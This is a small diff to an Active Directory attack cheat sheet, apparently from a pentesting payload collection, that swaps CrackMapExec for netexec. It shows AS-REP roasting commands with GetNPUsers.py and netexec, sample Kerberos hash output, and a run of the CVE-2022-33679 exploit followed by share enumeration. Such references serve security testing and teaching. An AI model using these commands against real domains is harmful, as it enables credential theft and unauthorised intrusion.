@@ -44,9 +44,9 @@
   root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
   ```
 
-* CrackMapExec Module
+* netexec Module
   ```powershell
-  $ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt
+  $ netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt
   LDAP        10.0.2.11       389    dc01           $krb5asrep$23$john.doe@LAB.LOCAL:5d1f750[...]2a6270d7$096fc87726c64e545acd4687faf780[...]13ea567d5
   ```
 
@@ -106,7 +106,7 @@ Research from Project Zero : https://googleprojectzero.blogspot.com/2022/10/rc4-
   ```bash
   user@hostname:~$ python CVE-2022-33679.py DOMAIN.LOCAL/User DC01.DOMAIN.LOCAL
   user@hostname:~$ export KRB5CCNAME=/home/project/User.ccache
-  user@hostname:~$ crackmapexec smb DC01.DOMAIN.LOCAL -k --shares
+  user@hostname:~$ netexec smb DC01.DOMAIN.LOCAL -k --shares
   ```
 
 **Mitigations**: 
